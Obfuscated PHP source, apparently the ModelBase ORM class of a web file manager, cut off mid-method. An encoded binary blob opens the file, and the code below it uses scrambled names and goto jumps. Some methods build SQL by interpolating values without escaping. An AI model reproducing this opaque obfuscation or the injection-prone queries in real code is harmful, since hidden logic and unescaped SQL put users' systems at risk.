ù·ÿıµDúıléğ®¼aş'."\r".'ömœ{Í’k'."\n".'')."\340\43\307\2\74\131\330\23\210\45\232\232\375\170\3\146\207\113\36\172\255\41\230\317\222\65\26\336\225\362\271\312\373\21\77\47\373\337\167\13\25\372\361\276\201\373\41\254\322\13\356\205\224\67\201\126\213\73"."\x12\xd9\xea\xd0\xed\x7\xda\x80\x45\x2d\x66\xf1\xef\x94\x4d\xa7\x40\xda\xc2\xf1\x98\x62\x6\x11\x81\x10\x1\x86\xef\x40\x6d\x5\x2\x44\x9e\x6b\xc0\x21\x8d\x87\x24\x10\x22\x7f\xe6\x4e\x90\xaa\x20\xae\xc7\x14\x87\xa6\x62\x63\x49\x19"."\34\127\371\103\357\147\160\17\63\150\56\133\346\265\360\140\264\370\34\5\52\110\234\46\225\105\243\223\15\122\137\62\261\221\356\10\162\310\350\131\304\136\30\201\144\300\253\140\45\12\123\343\51\246\146\175\344\50"."\x48\xcf\x87\x81\x70\x65\xd9\x3a\x81\x38\xb7\xd1\x13\xd8\x53\xca\x6\xa4\x3d\x80\x38\x1\x67\x77\x80\xd\xa9\xc2\xf6\x87\xc8\xf4\x5c\x36\x46\xd\x15\xbc\x67\x91\xc3\x17\xde\x53\x1e\x26\x8f\x89\xcf\x64\x83\x28\x23\x66\xb2\xf4\x12\x6"."\211\374\170\343\317\12\53\53\137\104\171\250\217\232\261\300\210\160\364\210\266\32\54\161\120\334\205\300\107\332\160\210\212\322\254\26\150\61\250\66\257\160\45\40\121\222\345\35\5\351\2\4\365\334\221\171\71\314"."\123\215\217\342\6\375\200\214\0\213\143\176\344\27\21\31\327\126\71\353\162\267\247\230\112\210\312\141\211\221\10\227\351\221\301\200\160\161\211\342\314\137\60\175\154\217\276\301\47\63\117\106\320\5\24\333\272\343"."\203\115\202\222\315\362\245\125\174\4\51\233\220\165\27\40\256\41\223\272\314\253\26\21\345\372\52\273\105\52\162\362\6\344\325\344\120\25\27\131\260\353\241\266\230\260\252\11\262\100\5\32\147\55\100\144\140\132".strrev('C°§V¥Ğ–JÕğBìP<–ZˆóPdTtô€œyHXÛ	êÈ&y|L<¤€PK6„4')."\301\110\206\330\267\226\103\335\112\217\151\225\271\331\164\24\263\304\101\305\254\7\46\142\121\130\371\0\156\350\303\160\313\355\262\25\307\346\113\325\71\242\32\370\120\131\334\127\202\220\130\61\72\311\102\272\206\4".base64_decode('JCuUnRAIhnSCFlvEzqZsB91gKyNcAuHXaVUN6Wp4IhJgVlKkv7cOuduHABjALxyuJvLaamkvSfgPvw==').strrev('@o­“DDN~ô›|~6Øüjæ;nçõÛiÿAmKÃ¸ØÒïÂ@­Btâ3ïâ^¼i@¥«!a“Ys').base64_decode('N+HWqdJRDS2p6YaAJry6sxS+noCDvWqePnVDZgDNXq1IQCIR0zKYUBimEjjYY0h86NGuGW+ELfthog==')."\101\46\202\204\373\60\150\113\141\165\166\214\22\21\230\276\175\113\112\20\256\161\254\27\152\32\135\105\53\70\132\121\355\21\222\121\56\372\214\42\370\205\57\220\4\270\57\22\224\214\17\231\75\45\231\151\127\331"."\163\365\133\166\26\302\365\133\22\221\56\337\361\241\214\11\120\113\364\217\247\240\332\163\230\203\252\236\352\124\363\51\73\176\61\237\140\120\216\16\6\243\263\32\30\210\145\234\251\333\340\302\372\303\331\252\134\342"."\127\61\134\76\116\245\272\344\122\25\124\346\71\200\101\1\204\241\42\11\111\170\50\211\173\311\126\312\342\327\11\136\272\162\365\201\210\225\120\376\220\222\275\135\150\302\61\70\271\21\313\13\36\6\11\271\161\20"."\302\111\62\347\223\302\46\3\52\147\162\257\224\270\216\154\47\316\77\151\175\357\211\241\61\351\15\340\40\43\13\247\5\152\333\152\301\343\131\272\16\333\222\310\61\200\120\174\325\323\2\13\51\364\10\305\211\27"._kodDe('MNFedlTtQpX2WUV5BVVd8p/KqIRXBbwepgZZ+q93ediEdcbbBCbwUEv8TmcL1qhfV6wTmVCGq8yviiA=')."\103\257\350\37\222\247\372\247\355\37\240\335\143\337\133\361\102\204\75\116\305\335\174\124\253\222\7\327\250\152\66\234\4\163\162\171\316\222\327\50\253\146\162\260\152\136\234\4\363\126\44\323\314\302\241\206\220\317"."\x94\x8b\xc6\x38\xcd\xab\xec\x3c\xb2\x57\xaf\xe0\x4a\x0\x64\xdb\xc5\x62\xd4\xf1\xfa\xb3\x2a\x72\xe5\xe7\x8\xf1\xd8\xb1\xd1\xe6\xbe\x7a\x2d\xaa\x1e\xaa\x8c\x57\x8b\xaa\xc8\xe3\xd6\x82\x63\xdb\xae\xdc\xab\xf1\x43\x9a\x52\x85\x3\xf2".base64_decode('G/JKXsvTqtzX4zLhQhy2qLRWJIuX/9XVA8JVZ7Fhvbe3wcWO4T5NiZfToTx1Cwayc3ebUBPeo9s7hw==').base64_decode('SoE2B9aU9vJFwWlyVQ/YDrgxrtx5ZqnTONE/ON6jaKaaFPSEIFB0cY3T6Uey/GyNSAL4oMYnqr2/ew==')."\353\361\357\334\161\325\73\67\134\372\316\157\67\154\333\170\256\143\373\51\127\154\277\340\244\355\27\234\266\355\344\113\267\235\167\65\116\330\176\341\261\357\235\367\333\171\322\366\223\176\15\23\317\71\341\355\73\157"."\xc5\xff\x6e\xfb\xdd\xd6\x77\x6f\xb8\x7\xc8\x89\x18\x65\xdb\x96\xad\xef\x6e\xb9\xe2\x9d\xb3\xae\xde\x7e\xe2\x6d\xdb\x37\x5d\xb2\xfd\xec\x13\xe9\x3b\xb1\x96\x33\x9f\xca\xf3\x21\x17\x3f\xbe\xb6\x38\x65\xc7\xb\x3c\x39\xba\xc7\x37\x6c"."\110\61\214\335\332\300\215\232\3\257\233\70\71\242\351\46\164\266\0\370\175\1\375\166\152\246\111\331\20\20\257\21\46\22\3\221\57\47\101\345\0\204\370\25\15\34\41\164\153\200\150\31\361\34\24\44\167\175"."\x70\x53\x1b\x51\x70\x2a\xe2\x54\x96\x8\xbc\x8d\x60\x91\x70\xe5\xb5\x43\x57\xd1\x76\xcb\xc8\x1\x60\x3b\x9a\xd0\x46\x8\x29\xa1\x57\xa1\x78\x7d\xe0\xed\x1\xe9\x16\xbb\xa8\xc7\x15\x2\x8\x2d\x8b\xa\x14\x48\x93\xd1\x70\xe3\x14\x37"."\261\172\160\242\62\234\344\175\123\246\365\110\262\247\320\334\143\336\140\177\250\4\162\74\311\213\100\252\320\370\264\251\57\30\215\373\127\4\42\321\110\105\122\310\23\211\54\17\206\175\130\163\272\42\31\345\22\264".base64_decode('VSqSQt3BvvHS/L2eQE9FGtRegfrc9AlenBQIoVp6enqo+mRlLQLeJbwm6FKVn5kXBjV6LGxT7aJXDA==')."\21\231\116\66\361\311\30\45\307\116\273\204\42\254\147\17\342\60\33\364\131\150\26\50\124\354\100\4\341\1\152\230\364\221\302\302\324\321\151\237\177\51\147\34\114\32\106\15\22\325\327\370\265\261\313\162\275\54".strrev(''."\0".''."\0".'È4´ßº7ÿÉ& ­DÍÂÍ<Çæ8BZ5“k©‹¦°ŞT ^W^&=ª†€FiqB KìAdÑÀ').base64_decode('').strrev('')."", 10, -8))); goto e¬İ›®È–Å; BâˆÀã¨šì: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\171\124\x69\155\x65", "\x74\x69\x6d\x65", "\151\156\163\x65\162\x74\54\x75\160\144\141\164\145", "\146\165\156\143\x74\x69\157\156"), array("\143\162\145\x61\164\x65\124\151\x6d\x65", "\x74\151\x6d\x65", "\x69\x6e\163\145\x72\x74", "\146\165\156\143\x74\x69\157\156")); public function setDataAuto($dÏÆ×Õ†Àä) { $this->dataAuto = $dÏÆ×Õ†Àä; } public function __construct($cŞ†¶éêó = '', $a¥‘ªËéËŸ = '', $dğÀ«Ø¿÷¤ = '') { parent::__construct($cŞ†¶éêó, $a¥‘ªËéËŸ, $dğÀ«Ø¿÷¤); } public static function textEncode($dŞªÊğ¤Š) { if (!$dŞªÊğ¤Š) { return $dŞªÊğ¤Š; } $Aæ¤âİªÜ = json_encode($dŞªÊğ¤Š); $Aæ¤âİªÜ = preg_replace_callback($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][342], function ($Cè×Ò÷åôâ) { return addslashes($Cè×Ò÷åôâ[0]); }, $Aæ¤âİªÜ); return json_decode($Aæ¤âİªÜ); } public static function textDecode($bòÜÍ§Œ¡Ù) { $eÑÅÑ½Œèè =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $bœºòÙÆŠ¸ = json_encode($bòÜÍ§Œ¡Ù); $bœºòÙÆŠ¸ = preg_replace_callback($eÑÅÑ½Œèè[343], function ($D‡‰†•†ø) { return $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][93]; }, $bœºòÙÆŠ¸); return json_decode($bœºòÙÆŠ¸); } protected $tableMeta = array(); protected function _beforeInsert(&$D˜ùì´‘‚ë, $dùø°ŒóÜ¾) { $DÕ•‡–ùĞ™ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$this->checkDataAutoHas($DÕ•‡–ùĞ™[344])) { return; } $this->dataBeforeFilter($D˜ùì´‘‚ë, $DÕ•‡–ùĞ™[344]); } protected function _beforeUpdate(&$AÛšÕ¢Çîæ, $d”¡çßš) { $FŒàŠ´‹½Ò =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$this->checkDataAutoHas($FŒàŠ´‹½Ò[345])) { return; } $this->dataBeforeFilter($AÛšÕ¢Çîæ, $FŒàŠ´‹½Ò[345]); } protected function _afterSelect(&$fœ‰ƒ¦¾›„, $F÷ÜÓÊÍ¬Ğ) { if (!is_array($fœ‰ƒ¦¾›„)) { return; } if (!$this->checkDataAutoHas($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][346])) { return; } foreach ($fœ‰ƒ¦¾›„ as &$dã…Õ©ã«ñ) { $this->dataAfterFilter($dã…Õ©ã«ñ); } unset($dã…Õ©ã«ñ); } protected function _afterFind(&$aóªÎä ½¨, $dæöÏ‹×œ) { if (!is_array($aóªÎä ½¨)) { return; } if (!$this->checkDataAutoHas($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][346])) { return; } $this->dataAfterFilter($aóªÎä ½¨); } public function setAutoIncrement($fÈå¾óˆÛ) { $C«Š¿ ·ê¸ = array($this->getPk() => $fÈå¾óˆÛ); $DçÈ˜•‰…œ = $this->data($C«Š¿ ·ê¸)->add(); if ($DçÈ˜•‰…œ) { $this->delete($DçÈ˜•‰…œ); } } public function getAutoIncrement() { $D…Û‚™Š = $this->getTableName(); $c¶šÊ¶ÌÏÏ = $this->max($this->getPk()); $c¸…Š©‰Ã’ = $this->query("\163\x68\x6f\167\40\x74\x61\x62\154\x65\40\x73\x74\141\164\165\x73\40\167\x68\x65\x72\145\x20\x4e\x61\x6d\145\x3d\x27{$D…Û‚™Š}\x27"); $d‡ô¸â”¤µ = $c¸…Š©‰Ã’[0][$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][347]]; $eÍ¦ê«ß¾± = max($c¶šÊ¶ÌÏÏ, $d‡ô¸â”¤µ); return $eÍ¦ê«ß¾±; } protected function _callBefore($D—ÜØ‘Ğİ›, $cíÂ§İöŞ²) { return $this->cacheCallCheck($D—ÜØ‘Ğİ›, $cíÂ§İöŞ², !1); } protected function _callAfter($Fö›“õ­»˜, $bŞÒƒïŞ™) { return $this->cacheCallCheck($Fö›“õ­»˜, $bŞÒƒïŞ™, !0); } protected function cacheFunctionAlias($BÎ›—İ¿‚) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($e‰‹ˆÓä‚¡, $c‰§Ê‘“—ë, $b‚Æ¤óŠíØ = false) { $fè‹˜µ¾Ñà = $this->cacheFunctionAlias($c‰§Ê‘“—ë); if (!$fè‹˜µ¾Ñà) { return; } foreach ($fè‹˜µ¾Ñà as $b½¿‚£éÚ¬ => $d•ğµé³¬è) { $d¶òÙ„¤Şò = $d•ğµé³¬è[0]; $cÁØÉéê™ = explode($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][47], $d•ğµé³¬è[1]); if ($e‰‹ˆÓä‚¡ == $b½¿‚£éÚ¬) { return $this->cacheFunctionGet($b½¿‚£éÚ¬, $d¶òÙ„¤Şò); } if ($b‚Æ¤óŠíØ && in_array($e‰‹ˆÓä‚¡, $cÁØÉéê™)) { $this->cacheFunctionClear($b½¿‚£éÚ¬, $d¶òÙ„¤Şò); } } } public function cacheFunctionGet($cÇ‚ôÀ‘«‹, $dŞÜÃÄâÚî) { $AÍ±ÊÏ¡¤¡ = $this->cacheKeyMake($cÇ‚ôÀ‘«‹, $dŞÜÃÄâÚî); $fŒ“á¶¿“× = Cache::get($AÍ±ÊÏ¡¤¡); if (!is_array($fŒ“á¶¿“×)) { $fŒ“á¶¿“× = call_user_func_array(array($this, $cÇ‚ôÀ‘«‹), array($dŞÜÃÄâÚî, !0)); Cache::set($AÍ±ÊÏ¡¤¡, $fŒ“á¶¿“×); } return $fŒ“á¶¿“×; } public function cacheFunctionClear($Aã÷ˆÙ¾Çš, $dâğ—é¦„¥) { $E™ÄŠŸ¹Ûù = $dâğ—é¦„¥; if (!is_array($dâğ—é¦„¥)) { $E™ÄŠŸ¹Ûù = array($dâğ—é¦„¥); } foreach ($E™ÄŠŸ¹Ûù as $Fµœİ¢Óªà) { $aÜ²Ö¼Á˜ = $this->cacheKeyMake($Aã÷ˆÙ¾Çš, $Fµœİ¢Óªà); Cache::remove($aÜ²Ö¼Á˜); } } private function cacheKeyMake($e¾ªÅ³Ó, $d»¾öñ³öÅ) { $d¿„òšÕêÊ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; return get_class($this) . $d¿„òšÕêÊ[70] . $e¾ªÅ³Ó . $d¿„òšÕêÊ[348] . $d»¾öñ³öÅ; } protected function selectPage($eƒ‘Ïö¦ˆ³ = 200, $EÜ“²÷Ë»ø = 1) { goto E³êå¼æ²; d„Ô°ìÃ¹: $d ¼©ÔŞ˜Ñ = 4000; $eƒ‘Ïö¦ˆ³ = isset($in[$e¨Áğˆ [349]]) ? $in[$e¨Áğˆ [349]] : $eƒ‘Ïö¦ˆ³; if ($eƒ‘Ïö¦ˆ³ === -1) { unset($in[$e¨Áğˆ [349]]); $d ¼©ÔŞ˜Ñ = 100000000; $eƒ‘Ïö¦ˆ³ = $d ¼©ÔŞ˜Ñ; } goto DáßğÊƒï®; eˆÌ¼Ş¹Àñ: $c¼¿˜¿é¯˜ = intval($this->count()); $eƒ‘Ïö¦ˆ³ = intval($eƒ‘Ïö¦ˆ³); $eƒ‘Ïö¦ˆ³ = $eƒ‘Ïö¦ˆ³ <= 5 ? 5 : ($eƒ‘Ïö¦ˆ³ >= $d ¼©ÔŞ˜Ñ ? $d ¼©ÔŞ˜Ñ : $eƒ‘Ïö¦ˆ³); goto fŠèÏŒêÊ„; E³êå¼æ²: $e¨Áğˆ  =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; global $in; $f¯‘·¡™´ = $this->optionsValue(); goto d„Ô°ìÃ¹; DáßğÊƒï®: $A„ê˜™­ƒ§ = $f¯‘·¡™´; $A„ê˜™­ƒ§[$e¨Áğˆ [350]] = array(); $this->optionsValue($A„ê˜™­ƒ§); goto eˆÌ¼Ş¹Àñ; e‰÷„÷¦’à: $this->optionsValue($f¯‘·¡™´); $D¼‚æ²Ä¼ = $this->page($EÜ“²÷Ë»ø, $eƒ‘Ïö¦ˆ³)->select(); $D¼‚æ²Ä¼ = is_array($D¼‚æ²Ä¼) ? $D¼‚æ²Ä¼ : array(); goto fù«à¬»ƒ; fù«à¬»ƒ: if ($eˆŠ»Š‚Ã¹ == 1) { $c¼¿˜¿é¯˜ = count($D¼‚æ²Ä¼); } $c³÷ŸíƒÍ = array($e¨Áğˆ [351] => array($e¨Áğˆ [352] => $c¼¿˜¿é¯˜, $e¨Áğˆ [349] => $eƒ‘Ïö¦ˆ³, $e¨Áğˆ [340] => $EÜ“²÷Ë»ø, $e¨Áğˆ [353] => $eˆŠ»Š‚Ã¹), $e¨Áğˆ [354] => $D¼‚æ²Ä¼ ? $D¼‚æ²Ä¼ : array()); return $c³÷ŸíƒÍ; goto FÕÏùª³¬; fŠèÏŒêÊ„: $eˆŠ»Š‚Ã¹ = ceil($c¼¿˜¿é¯˜ / $eƒ‘Ïö¦ˆ³); $EÜ“²÷Ë»ø = intval(isset($in[$e¨Áğˆ [340]]) ? $in[$e¨Áğˆ [340]] : $EÜ“²÷Ë»ø); $EÜ“²÷Ë»ø = $EÜ“²÷Ë»ø <= 1 ? 1 : ($EÜ“²÷Ë»ø >= $eˆŠ»Š‚Ã¹ ? $eˆŠ»Š‚Ã¹ : $EÜ“²÷Ë»ø); goto e‰÷„÷¦’à; FÕÏùª³¬: } protected function checkLength($FÄ¶ó¹®øá, $aõ¶±“Ïß = 0, $D—Üøàºƒ‡ = '') { $Cˆ×Ğ‚¶š =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aõ¶±“Ïß = $aõ¶±“Ïß ? $aõ¶±“Ïß : 65536; if (!$FÄ¶ó¹®øá || strlen($FÄ¶ó¹®øá) < $aõ¶±“Ïß) { return; } $D—Üøàºƒ‡ = $D—Üøàºƒ‡ ? $D—Üøàºƒ‡ . $Cˆ×Ğ‚¶š[67] : $Cˆ×Ğ‚¶š[33]; show_json($D—Üøàºƒ‡ . LNG($Cˆ×Ğ‚¶š[355]) . "\x28{$aõ¶±“Ïß}\51", !1); } protected function metaSet($d«±Å»§ˆ, $c‘Õ ·Å»÷ = null, $F…¶‰ÈÅŞ = null) { goto bĞö²‚‹§; Cšƒëˆºƒ‘: if (is_null($c‘Õ ·Å»÷)) { return $eØª¿ï‰ŸÙ->where(array($d»ÃìòØ·¿ => $d«±Å»§ˆ))->delete(); } if (is_null($F…¶‰ÈÅŞ) && is_string($c‘Õ ·Å»÷)) { return $eØª¿ï‰ŸÙ->where($cŒ‡ØæœƒÅ)->delete(); } $B—‚²§åœ = is_array($c‘Õ ·Å»÷) ? $c‘Õ ·Å»÷ : array(); goto BÚŸÀ‹È¢Ó; BŞ’½óùù: $Bğß¨Öƒµ = $this->tableMeta[$Ağ°ØÄ„êÆ[357]]; $eØª¿ï‰ŸÙ = Model($Bğß¨Öƒµ); $cŒ‡ØæœƒÅ = array($d»ÃìòØ·¿ => $d«±Å»§ˆ, $Ağ°ØÄ„êÆ[358] => $c‘Õ ·Å»÷); goto Cšƒëˆºƒ‘; e‹¡Ñ±Æš: $eØª¿ï‰ŸÙ->where(array($d»ÃìòØ·¿ => $d«±Å»§ˆ))->addAll($a£ƒ¨³ô‘‡, array(), !0); return !0; goto dÄ’õêáó›; bĞö²‚‹§: $Ağ°ØÄ„êÆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$this->tableMeta) { return !1; } $d»ÃìòØ·¿ = $this->tableMeta[$Ağ°ØÄ„êÆ[356]]; goto BŞ’½óùù; BÚŸÀ‹È¢Ó: if (is_string($c‘Õ ·Å»÷)) { $B—‚²§åœ[$c‘Õ ·Å»÷] = $F…¶‰ÈÅŞ; } $a£ƒ¨³ô‘‡ = array(); foreach ($B—‚²§åœ as $d±·»¶¨ï => $B ÉÅò´Š) { $this->checkLength($B ÉÅò´Š, !1, $Bğß¨Öƒµ . $Ağ°ØÄ„êÆ[4] . $d±·»¶¨ï); $a£ƒ¨³ô‘‡[] = array($d»ÃìòØ·¿ => $d«±Å»§ˆ, $Ağ°ØÄ„êÆ[89] => $d±·»¶¨ï, $Ağ°ØÄ„êÆ[359] => $B ÉÅò´Š); } goto e‹¡Ñ±Æš; dÄ’õêáó›: } public function metaGet($Eùé·ïğ…æ, $A§†‡Ú„·¼ = false) { goto bÌÍ·ĞÎ’Š; bÌÍ·ĞÎ’Š: $EŒ×–æËñ‰ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$this->tableMeta) { return array(); } $C—Ş½ÎÏĞº = $this->tableMeta[$EŒ×–æËñ‰[356]]; goto Dóõåó—¼ğ; Dóõåó—¼ğ: $Dçˆ™‡½Ä = Model($this->tableMeta[$EŒ×–æËñ‰[357]]); if ($A§†‡Ú„·¼) { $eÎµÔà© = array($C—Ş½ÎÏĞº => $Eùé·ïğ…æ, $EŒ×–æËñ‰[89] => $A§†‡Ú„·¼); return $Dçˆ™‡½Ä->where($eÎµÔà©)->getField($EŒ×–æËñ‰[359]); } $eÎµÔà© = array($C—Ş½ÎÏĞº => $Eùé·ïğ…æ); goto DŠÅí÷³é; DŠÅí÷³é: $bä÷áŸ˜©Ú = $Dçˆ™‡½Ä->field($EŒ×–æËñ‰[360])->where($eÎµÔà©)->select(); $bä÷áŸ˜©Ú = array_to_keyvalue($bä÷áŸ˜©Ú, $EŒ×–æËñ‰[89], $EŒ×–æËñ‰[359]); return $bä÷áŸ˜©Ú; goto FĞ•ôŞ“ò¿; FĞ•ôŞ“ò¿: } private function checkDataAutoHas($Eˆ—Ô‡ŒÛ¼) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $EˆÂ„âÄ¬Á) { if (in_array($Eˆ—Ô‡ŒÛ¼, explode($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][47], $EˆÂ„âÄ¬Á[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$eÛ†ÉäÛ‚­, $E»ù”óÃ­Í) { $dŠâ‹ç— =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; foreach ($this->dataAuto as $E¤ÑåæÂÒ) { $dÃŸ•áÃó = $E¤ÑåæÂÒ[0]; if (!in_array($E»ù”óÃ­Í, explode($dŠâ‹ç—[47], $E¤ÑåæÂÒ[2]))) { continue; } switch (trim($E¤ÑåæÂÒ[3])) { case $dŠâ‹ç—[309]: case $dŠâ‹ç—[310]: $cğØš‹‰ŸŒ = $E¤ÑåæÂÒ[1]; $Fìç¢İ£® = isset($E¤ÑåæÂÒ[4]) ? (array) $E¤ÑåæÂÒ[4] : array(); if ($cğØš‹‰ŸŒ == $dŠâ‹ç—[190] && array_key_exists($dÃŸ•áÃó, $eÛ†ÉäÛ‚­)) { if (!$eÛ†ÉäÛ‚­[$dÃŸ•áÃó]) { unset($eÛ†ÉäÛ‚­[$dÃŸ•áÃó]); } break; } if (isset($eÛ†ÉäÛ‚­[$dÃŸ•áÃó])) { array_unshift($Fìç¢İ£®, $eÛ†ÉäÛ‚­[$dÃŸ•áÃó]); } if ($dŠâ‹ç—[309] == $E¤ÑåæÂÒ[3]) { $eÛ†ÉäÛ‚­[$dÃŸ•áÃó] = call_user_func_array($cğØš‹‰ŸŒ, $Fìç¢İ£®); } else { $eÛ†ÉäÛ‚­[$dÃŸ•áÃó] = call_user_func_array(array(&$this, $cğØš‹‰ŸŒ), $Fìç¢İ£®); } break; case $dŠâ‹ç—[261]: $eÛ†ÉäÛ‚­[$dÃŸ•áÃó] = $eÛ†ÉäÛ‚­[$E¤ÑåæÂÒ[1]]; break; case $dŠâ‹ç—[282]: if (isset($eÛ†ÉäÛ‚­[$dÃŸ•áÃó]) && !is_string($eÛ†ÉäÛ‚­[$dÃŸ•áÃó])) { $eÛ†ÉäÛ‚­[$dÃŸ•áÃó] = json_encode_force($eÛ†ÉäÛ‚­[$dÃŸ•áÃó]); } break; case $dŠâ‹ç—[311]: if ($eÛ†ÉäÛ‚­[$dÃŸ•áÃó] === $dŠâ‹ç—[33]) { unset($eÛ†ÉäÛ‚­[$dÃŸ•áÃó]); } break; case $dŠâ‹ç—[312]: $eÛ†ÉäÛ‚­[$dÃŸ•áÃó] = $E¤ÑåæÂÒ[1]; default: break; } } if ($E»ù”óÃ­Í == $dŠâ‹ç—[344]) { $FàÈº¢…ø… = strtolower($this->db->getDbType()); if (strpos($FàÈº¢…ø…, $dŠâ‹ç—[9]) !== 0) { return; } $e‡ß¶¤¤‚ñ = $this->field(!0)->fields; $BÄ£•æ¡¦Š = $e‡ß¶¤¤‚ñ[$dŠâ‹ç—[240]]; if (isset($e‡ß¶¤¤‚ñ[$dŠâ‹ç—[239]])) { unset($BÄ£•æ¡¦Š[$e‡ß¶¤¤‚ñ[$dŠâ‹ç—[239]]]); } foreach ($BÄ£•æ¡¦Š as $D«£À¤Î => $E»ù”óÃ­Í) { if (!isset($eÛ†ÉäÛ‚­[$D«£À¤Î])) { $eÛ†ÉäÛ‚­[$D«£À¤Î] = $dŠâ‹ç—[33]; } } } } private function dataAfterFilter(&$bÏËã«šî…) { $E×¹À¹£™ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; foreach ($this->dataAuto as $bä¸ğÉç¤Œ) { $FËØö£ÅóŠ = $bä¸ğÉç¤Œ[0]; if (!in_array($E×¹À¹£™[346], explode($E×¹À¹£™[47], $bä¸ğÉç¤Œ[2]))) { continue; } if (!isset($bÏËã«šî…[$FËØö£ÅóŠ])) { continue; } switch (trim($bä¸ğÉç¤Œ[3])) { case $E×¹À¹£™[309]: case $E×¹À¹£™[310]: $f÷©èî°Èß = isset($bä¸ğÉç¤Œ[4]) ? (array) $bä¸ğÉç¤Œ[4] : array(); array_unshift($f÷©èî°Èß, $bÏËã«šî…[$FËØö£ÅóŠ]); if ($E×¹À¹£™[309] == $bä¸ğÉç¤Œ[3]) { $bÏËã«šî…[$FËØö£ÅóŠ] = call_user_func_array($bä¸ğÉç¤Œ[1], $f÷©èî°Èß); } else { $bÏËã«šî…[$FËØö£ÅóŠ] = call_user_func_array(array(&$this, $bä¸ğÉç¤Œ[1]), $f÷©èî°Èß); } break; case $E×¹À¹£™[261]: $bÏËã«šî…[$FËØö£ÅóŠ] = $bÏËã«šî…[$bä¸ğÉç¤Œ[1]]; break; case $E×¹À¹£™[282]: $bå•İä©— = $bÏËã«šî…[$FËØö£ÅóŠ]; $bÏËã«šî…[$FËØö£ÅóŠ] = json_decode($bå•İä©—, !0); if (is_null($bÏËã«šî…[$FËØö£ÅóŠ])) { $bÏËã«šî…[$FËØö£ÅóŠ] = $bå•İä©—; } break; case $E×¹À¹£™[311]: if ($bÏËã«šî…[$FËØö£ÅóŠ] === $E×¹À¹£™[33]) { unset($bÏËã«šî…[$FËØö£ÅóŠ]); } break; case $E×¹À¹£™[312]: $bÏËã«šî…[$FËØö£ÅóŠ] = $bä¸ğÉç¤Œ[1]; default: break; } } } public function saveAll($e †¦ÆáÒ«) { goto B‰Š¥õ¶õ¨; B‰Š¥õ¶õ¨: $A˜Ê‹ÍØ´ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $DìÅòµ¤¢ = $this->tablePrefix . $this->tableName; $Cµ†ù…”‹é = self::SQL_WHERE_IN_CHUNK; goto C¹‰ÅŞëò; Câ½ØŞÇ×ï: $this->chunkEventSet(); goto Aîµ™ñ™­; BÄ¤¾‰±ù: $bÄïİë¿Ñˆ = array(); $eÎªİù„òµ = count($e †¦ÆáÒ«); for ($Fˆˆ•Ÿ˜® = 0; $Fˆˆ•Ÿ˜® < $eÎªİù„òµ; $Fˆˆ•Ÿ˜®++) { $bí­¶§Œİ– = $e †¦ÆáÒ«[$Fˆˆ•Ÿ˜®]; if (!is_array($bí­¶§Œİ–) || count($bí­¶§Œİ–) != 4) { continue; } $bªµí«ŠŞÂ = "\125\120\104\101\x54\x45\40\x60{$DìÅòµ¤¢}\140\x20\x53\105\124\x20{$bí­¶§Œİ–[2]}\x20\x3d\40\x43\x41\123\105\x20{$bí­¶§Œİ–[0]}\x20\12"; if ($b¹°‚éçÏ == 0) { $CĞ¹ğ®´œî = $bªµí«ŠŞÂ; } $bÄïİë¿Ñˆ[] = $A˜Ê‹ÍØ´[113] . $bí­¶§Œİ–[1] . $A˜Ê‹ÍØ´[113]; $b¹°‚éçÏ++; $CĞ¹ğ®´œî .= "\40\x57\x48\105\x4e\x20\x27{$bí­¶§Œİ–[1]}\x27\40\124\110\x45\x4e\x20\47{$bí­¶§Œİ–[3]}\x27\40\12"; if ($b¹°‚éçÏ == $Cµ†ù…”‹é || $Fˆˆ•Ÿ˜® == $eÎªİù„òµ - 1) { goto fµõÒà£Ó¨; b†ÚÒ›Ç¸: $b¹°‚éçÏ = 0; $CĞ¹ğ®´œî = $bªµí«ŠŞÂ; $this->chunkEventCheck(count($bÄïİë¿Ñˆ)); goto Fñæà„ƒÜô; Fñæà„ƒÜô: $bÄïİë¿Ñˆ = array(); goto B‰ãİ»ôò; fµõÒà£Ó¨: $cçÊÆ´­ç = implode($A˜Ê‹ÍØ´[47], $bÄïİë¿Ñˆ); $CĞ¹ğ®´œî .= "\x20\105\116\x44\40\x20\127\110\105\x52\x45\x20{$bí­¶§Œİ–[0]}\40\x49\116\40\50{$cçÊÆ´­ç}\51\x20"; $this->execute($CĞ¹ğ®´œî); goto b†ÚÒ›Ç¸; B‰ãİ»ôò: } } goto Câ½ØŞÇ×ï; C¹‰ÅŞëò: $e †¦ÆáÒ« = is_array($e †¦ÆáÒ«) ? $e †¦ÆáÒ« : array(); $CĞ¹ğ®´œî = $A˜Ê‹ÍØ´[361]; $b¹°‚éçÏ = 0; goto BÄ¤¾‰±ù; Aîµ™ñ™­: } public function saveAllEach($B„®óğÄØ¢) { $eáÙØáòù =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $FŞˆ›õŠÕ = $this->tablePrefix . $this->tableName; foreach ($B„®óğÄØ¢ as $fÎî‘³ƒÑÏ) { if (!is_array($fÎî‘³ƒÑÏ) || count($fÎî‘³ƒÑÏ) != 4) { continue; } $A¹Úõå¾ğ = $fÎî‘³ƒÑÏ[0] . $eáÙØáòù[362] . $fÎî‘³ƒÑÏ[1] . $eáÙØáòù[113]; $A‹Á„…»á¤ = $fÎî‘³ƒÑÏ[2] . 